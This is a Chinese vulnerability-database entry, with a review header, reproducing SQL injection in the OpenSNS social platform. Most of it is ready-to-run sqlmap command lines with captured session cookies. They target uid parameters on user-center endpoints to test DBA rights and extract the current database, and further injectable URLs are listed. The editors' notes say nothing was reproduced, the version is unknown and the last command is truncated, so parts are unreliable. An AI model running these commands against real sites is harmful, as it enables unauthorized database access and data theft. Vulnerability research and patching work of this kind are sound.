---
source: "hatch 补库批 20260928"
product: "OpenSNS version unspecified"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "OpenSNS sql注入"
prerequisites: "来源所述条件，未列明部分仍待核：会员注册登录及完整session/OX_LOGGED_USER"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-3785b71adea4f057966be470"
entity_id: "ve-3785b71adea4f057966be470"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员注册登录及完整session/OX_LOGGED_USER

- **事实待核（1）**：版本空白，多条重复sqlmap只换提取选项无响应/源码，不是多个独立验证。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：uid多个入口需要分别建条件，不能按相似URL证明同漏洞。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **凭据与会话边界（3）**：最后--current-d命令截断；来源缺。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# OpenSNS sql注入

一、漏洞简介
------------

OpenSNS是基于OneThink的轻量级社交化用户中心框架，系统秉持简约的设计风格，注重交流，为用户提供了一套轻量级的社交方案。OpenSNS前身是"ThinkOX"，2015年1月28号正式更名为OpenSNS。
OpenSNS采用PHP+MYSQL构建的一款有"身份"的开源免费SNS社交系统，适用于多种社会关系。
OpenSNS采用thinkphp框架编写。系统的设计遵循高内聚低耦合，允许管理员自由开启关闭功能模块。不仅如此，OpenSNS还内置了一个功能扩展商店，可以一键在线安装新的功能扩展。
OpenSNS目前有大量的国内开发者，云市场也上架了大量的第三方功能模块和主题应用，使OpenSNS可以同时满足各行各业的社交需求。

二、漏洞影响
------------

三、复现过程
------------

### SQL注入(一)

需要注册一个账号并登录

    sqlmap.py -u "http://localhost/index.php?s=/ucenter/Config/&uid=1*" --cookie " PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136" --batch --technique=T --dbms "mysql"
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/Config/&uid=1*" --cookie " PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136" --batch --technique=T --dbms "mysql" --is-dba
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/Config/&uid=1*" --cookie " PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136" --batch --technique=T --dbms "mysql" --current-db

#### 同类h注入点

<http://0-sec.org/index.php?s=/ucenter/index/index&uid=10>
<http://0-sec.org/index.php?s=/ucenter/index/information&uid=10>

### SQL注入(二)

需要注册一个账号并登录

    sqlmap.py -u "http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+" --cookie "PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe" --dbms "mysql" --batch
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+" --cookie "PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe" --dbms "mysql" --batch --is-dba
    sqlmap.py -u "http://localhost/index.php?s=/ucenter/index/getExpandInfo&uid=1)*--+" --cookie "PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136;opensns_OX_LOGGED_USER=HYnkRzJxTkdgAdhKfVfkJ8n4kjemH%3DgWJU16IaiiFhglB7nm66fAxbZ9TTZXz%3DWWqjeQ5%3Di4bjZITf04G20E4v35V135D8miM5F2Jzf6VkgkYymtohawe" --dbms "mysql" --batch --current-d
